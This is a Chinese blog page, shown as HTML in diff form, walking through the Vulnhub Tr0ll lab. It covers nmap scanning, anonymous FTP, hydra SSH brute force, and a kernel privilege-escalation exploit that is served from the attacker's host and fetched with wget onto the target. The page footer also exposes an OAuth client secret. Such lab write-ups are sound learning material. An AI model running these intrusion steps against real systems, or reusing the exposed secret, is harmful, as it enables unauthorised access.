@@ -1,0 +1,350 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>vulnhub- Tr0ll靶机 | white0123</title>
+<link rel="shortcut icon" href="https://wghahaha.github.io/favicon.ico?v=1714286336284">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://wghahaha.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="vulnhub- Tr0ll靶机 | white0123 - Atom Feed" href="https://wghahaha.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="打靶训练第四台。虽然难度不高但是从中学到了一些思路和新的知识。
+环境搭建
+
+下载好靶机以后直接启动就可以了。注意要将靶机设置为NAT模式不然扫不到靶机的IP
+
+靶机下载地址:https://download.vulnhub.com/tr0l..." />
+    <meta name="keywords" content="vulnhub" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://wghahaha.github.io">
+  <img class="avatar" src="https://wghahaha.github.io/images/avatar.png?v=1714286336284" alt="">
+  </a>
+  <h1 class="site-title">
+    white0123
+  </h1>
+  <p class="site-description">
+    永远保持第一天接触网络安全的热情
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              vulnhub- Tr0ll靶机
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-09-17
+              </span>
+              <span>
+                5 min read
+              </span>
+              
+                <a href="https://wghahaha.github.io/tag/gd7wNOhQ5/" class="post-tag">
+                  # vulnhub
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p>打靶训练第四台。虽然难度不高但是从中学到了一些思路和新的知识。</p>
+<h2 id="环境搭建">环境搭建</h2>
+<blockquote>
+<p>下载好靶机以后直接启动就可以了。注意要将靶机设置为NAT模式不然扫不到靶机的IP</p>
+</blockquote>
+<p>靶机下载地址:https://download.vulnhub.com/tr0ll/Tr0ll.rar</p>
+<h2 id="信息探测">信息探测</h2>
+<blockquote>
+<p>这里用到的还是用的arp scan和nmap的扫描方式首先需要确定靶机的IP和开放端口以及对应的服务。</p>
+</blockquote>
+<pre><code>arp-scan -l
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230917202533712.png" alt="image-20230917202533712" loading="lazy"></figure>
+<p>确定靶机的IP地址为192.168.56.162</p>
+<p>然后通过nmap探测靶机开放的端口信息以及对应的服务版本信息等</p>
+<pre><code>nmap -sV 192.168.56.162
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230917203036528.png" alt="image-20230917203036528" loading="lazy"></figure>
+<p>确定了开放的端口信息 以及对应的服务</p>
+<blockquote>
+<p>21端口对应的是FTP服务       常用的就是匿名登录 信息泄露等攻击手段。</p>
+<p>22端口对应的是SSH服务      可以想到的就是暴力破解等。</p>
+<p>80端口对应的是httpp服务   需要重点关注的信息 很多时候这里就是切入口。</p>
+</blockquote>
+<p>我这里对应的优先级就是 21   80  22这样的顺序</p>
+<h2 id="ftp匿名登录">FTP匿名登录</h2>
+<p>通过匿名登录可以成功登录进FTP 用户名 anonymous  密码部分直接回车。</p>
+<p>进入后需要切换下格式 binary</p>
+<p>得到目录下有一个pacp格式的文件</p>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230917203754668.png" alt="image-20230917203754668" loading="lazy"></figure>
+<p>这个文件类型 在前面的靶机中没有出现过 其实就是那种流量日志文件，可以用wire shark打开分析。</p>
+<p>我们使用get命令将文件下载到本地</p>
+<pre><code>get lol.pcap
+</code></pre>
+<p>师傅们可以使用wireshark查看数据包 并分析</p>
+<pre><code>wireshark lol.pcap
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230917204112772.png" alt="image-20230917204112772" loading="lazy"></figure>
+<p>也可以用strings 查看文本文件的信息。</p>
+<pre><code>strings lol.pcap
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230917204328634.png" alt="image-20230917204328634" loading="lazy"></figure>
+<p>这里可以看到一些信息。我最开始看这些信息 也没看出来什么东西。我就去看那个80端口的信息了。</p>
+<h2 id="web渗透">web渗透</h2>
+<p>直接访问靶机IP</p>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230917204647068.png" alt="image-20230917204647068" loading="lazy"></figure>
+<p>没发现什么有用的东西，于是就暴破了下路径</p>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230917204813486.png" alt="image-20230917204813486" loading="lazy"></figure>
+<p>然后访问了这些路径</p>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230917204855065.png" alt="image-20230917204855065" loading="lazy"></figure>
+<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230917204909506.png" alt="image-20230917204909506" loading="lazy"></figure>
+<p>没有收集到什么信息，我开始还以为会是什么图片隐写术的操作、但是也不能下载图片啊 于是放弃了这种思路。</p>
+<p>搞了好久 才知道是最开始的分析包文件那里出了问题</p>
+<figure data-type="image" tabindex="10"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230917205311350.png" alt="image-20230917205311350" loading="lazy"></figure>
+<p>我们需要将后面指向的信息拼接在靶机IP后面</p>
+<p>具体原因就是那一段话 然后碰运气。</p>
+<p>拼接后访问一下</p>
+<figure data-type="image" tabindex="11"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230917205429140.png" alt="image-20230917205429140" loading="lazy"></figure>
+<p>其中有个文件 我们将它下载下俩看一下</p>
+<pre><code>wget http://192.168.56.162/sup3rs3cr3tdirlol/roflmao
+
+</code></pre>
+<figure data-type="image" tabindex="12"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230917205727983.png" alt="image-20230917205727983" loading="lazy"></figure>
+<blockquote>
+<p>这个文件直接查看会显示乱码 还是需要使用strings 查看</p>
+</blockquote>
+<pre><code>strings roflmao
+</code></pre>
+<p>得到许多信息 通过分析 感觉这段可能会是切入口</p>
+<figure data-type="image" tabindex="13"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230917205948800.png" alt="image-20230917205948800" loading="lazy"></figure>
+<p>这是一段十六进制 它提示了 address  这个单词就是网址的意思 那么明显就是要将这段十六进制加载网址的后面</p>
+<figure data-type="image" tabindex="14"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230917210157578.png" alt="image-20230917210157578" loading="lazy"></figure>
+<p>看到good luck我就感觉有希望了 。它有两个文件夹 通过查看后其中一个是密码 另外一个应该就是用户名了。web页面没找到什么需要登录的地方 ftp感觉不用登录了。那么目标自然就是瞄准SSH登录了。</p>
+<h2 id="ssh登录">SSH登录</h2>
+<p>将用户名和密码下载下来</p>
+<pre><code>wget http://192.168.56.162/0x0856BF/good_luck/which_one_lol.txt
+wget http://192.168.56.162/0x0856BF/this_folder_contains_the_password/Pass.txt
+</code></pre>
+<figure data-type="image" tabindex="15"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230917210619593.png" alt="image-20230917210619593" loading="lazy"></figure>
+<p>查看一下文本内容</p>
+<figure data-type="image" tabindex="16"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230917210703620.png" alt="image-20230917210703620" loading="lazy"></figure>
+<p>尝试进行暴力破解</p>
+<p>没有暴破出来</p>
+<pre><code>hydra -L which_one_lol.txt -P Pass.txt  ssh://192.168.56.162
+</code></pre>
+<figure data-type="image" tabindex="17"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230917211451230.png" alt="image-20230917211451230" loading="lazy"></figure>
+<p>我们回到下载页面前 看到说的是密码载这个文件夹里面 是不是还包括文件名呢？<br>
+结果还真是。。。</p>
+<p>将文件名加入字典中然后暴破</p>
+<figure data-type="image" tabindex="18"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230917211631661.png" alt="image-20230917211631661" loading="lazy"></figure>
+<pre><code>ssh overflow@192.168.56.162
+
+输入密码
+</code></pre>
+<figure data-type="image" tabindex="19"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230917211811151.png" alt="image-20230917211811151" loading="lazy"></figure>
+<p>成功登录进来了。</p>
+<h2 id="权限提升">权限提升</h2>
+<p>得到的不是完整的额shll环境我们通过python的pty模块得到完整的shell环境。</p>
+<pre><code>python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
+</code></pre>
+<figure data-type="image" tabindex="20"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230917212402635.png" alt="image-20230917212402635" loading="lazy"></figure>
+<p>我还在进行信息收集的信息的时候 直接就把我退出来了。</p>
+<figure data-type="image" tabindex="21"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230917212548103.png" alt="image-20230917212548103" loading="lazy"></figure>
+<p>通过提示信息 得到应该是有自动任务的 。我们可以尝试通过自动任务提权</p>
+<p>通过查阅资料 发现这种姿势在这个靶机中是可行的。</p>
+<p>但是我一直没有复现成功。</p>
+<p>所以这里我尝试 的是系统内核提权。</p>
+<p>上面可以看到Linux的系统版本为3.13.0</p>
+<p>直接用kali中的漏洞库</p>
+<pre><code>searchsploit 3.13.0
+</code></pre>
+<figure data-type="image" tabindex="22"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230917220532425.png" alt="image-20230917220532425" loading="lazy"></figure>
+<p>这里直接使用37292.c文件编译后执行就可以提了。</p>
+<p>将文件下载下来</p>
+<pre><code>searchsploit -m 37292.c
+</code></pre>
+<p>然后kali另外起一个终端开启http服务</p>
+<pre><code>python3 -m http.server 80
+</code></pre>
+<p>来到目标靶机 下载提权文件</p>
+<pre><code>wget http://192.168.56.132/37292.c
+</code></pre>
+<figure data-type="image" tabindex="23"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230917220841929.png" alt="image-20230917220841929" loading="lazy"></figure>
+<p>编译文件后执行 就可以成功提权了</p>
+<pre><code>37292.c -o white
+</code></pre>
+<pre><code>./white
+</code></pre>
+<p>查看权限 成功提权 得到flag</p>
+<figure data-type="image" tabindex="24"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230917221005124.png" alt="image-20230917221005124" loading="lazy"></figure>
+<h2 id="总结">总结</h2>
+<blockquote>
+<p>这个靶机的难度不高 但是前期的思路很独特 需要脑洞大开。尤其是前面的路径拼接和密码猜解。同时也学到了使用wire shark分析pcap包的操作。后面的提权比较简单，方式也比较多。我演示的是系统内核提权 除了这个还可以使用自动任务提权等方式进行权限提升。我看有个师傅的博客列举出了五种方式</p>
+</blockquote>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">环境搭建</a></li>
+<li><a href="#%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B">信息探测</a></li>
+<li><a href="#ftp%E5%8C%BF%E5%90%8D%E7%99%BB%E5%BD%95">FTP匿名登录</a></li>
+<li><a href="#web%E6%B8%97%E9%80%8F">web渗透</a></li>
+<li><a href="#ssh%E7%99%BB%E5%BD%95">SSH登录</a></li>
+<li><a href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87">权限提升</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://wghahaha.github.io/post/vulnhub-jarbas/">
+              <h3 class="post-title">
+                vulnhub-jarbas靶机
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '60a6742bb0cdc1129286',
+    clientSecret: '2c932a185a0c37b7924302f1ab242ffd3c186641',
+    repo: 'wghahaha.github.io',
+    owner: 'wghahaha',
+    admin: ['wghahaha'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  <div>
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	<span id="busuanzi_container_site_uv" style='display:none'>总访客人数量<span id="busuanzi_value_site_uv"></span>次</span>
+	<span id="busuanzi_container_site_pv" style='display:none'>本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+</div>
+  <a class="rss" href="https://wghahaha.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
